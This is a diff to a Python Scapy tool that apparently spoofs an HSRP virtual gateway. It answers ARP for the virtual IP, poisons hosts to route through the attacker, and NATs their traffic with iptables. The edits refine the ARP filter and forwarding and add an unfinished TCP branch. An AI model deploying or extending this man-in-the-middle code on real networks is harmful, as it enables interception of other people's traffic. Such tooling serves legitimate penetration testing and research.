@@ -252,7 +252,7 @@ def start_arp_responder(packet):
         virtualIP = "192.168.1.254"
     if debug:
         print(f"[DEBUG] Responding to ARP requests for {virtualIP}")
-    filterstring = f"arp and dst host {virtualIP} and src host not {virtualIP} and ether src host not {mymac}"
+    filterstring = f"arp and (arp[6:2] = 1) and dst host {virtualIP} and src host not {virtualIP} and ether src host not {mymac}"
     sniff(prn=arp_respond, filter=filterstring)
 
 def arp_respond(packet):
@@ -357,20 +357,26 @@ def manual_forwarding(packet):
                 del packet[IP].chksum
                 packet[proto].dport = dstport
                 del packet[proto].chksum
-                sendp(packet, verbose=False)
+                sendp(packet, verbose=False, realtime=True)
                 del translations[dport]
     # store src ip and port in dictionary along with new src port to use for future translation back to original ip
     else:
         try:
             sport = packet[TCP].sport
+            dport = packet[TCP].dport
             proto = "TCP"
         except:
             sport = packet[UDP].sport
+            dport = packet[UDP].dport
             proto = "UDP"
         finally:
             srcip = packet[IP].src
             newport = portcounter%60001 + 5535
             translations[newport] = srcip, sport
+            if proto == "TCP" and srcip in translations:
+                storedport = translations[srcip]
+                #if dport == storedport and :
+                #    return
             portcounter += 1
             packet[Ether].src = mymac
             del packet[Ether].dst
@@ -378,7 +384,7 @@ def manual_forwarding(packet):
             del packet[IP].chksum
             packet[proto].sport = newport
             del packet[proto].chksum
-            sendp(packet, verbose=False)
+            sendp(packet, verbose=False, realtime=True)
 
 def simple_poison(interval):
     '''Simple ARP poisoning to broadcast attacker as gateway using HSRP virtual IP'''
@@ -475,7 +481,7 @@ def user_input_handler():
                 print(f"[INFO] Debug set to {debug}")    
             case "translate":
                 # quick and simple validation
-                if usrinput[1].strip() < 7:
+                if len(usrinput[1].strip()) < 7:
                     print("[INFO] Please check input")
                 command = f"iptables -t nat -A POSTROUTING -o eth0 -s {usrinput[1]} -j MASQUERADE"
                 subprocess.run(command.split())
@@ -505,6 +511,7 @@ def setup():
     if not nosubinter:
         start_subinterface()
     change_default_gw()
+    
 
 def cleanup():
     routerip = pkcopy[IP].src
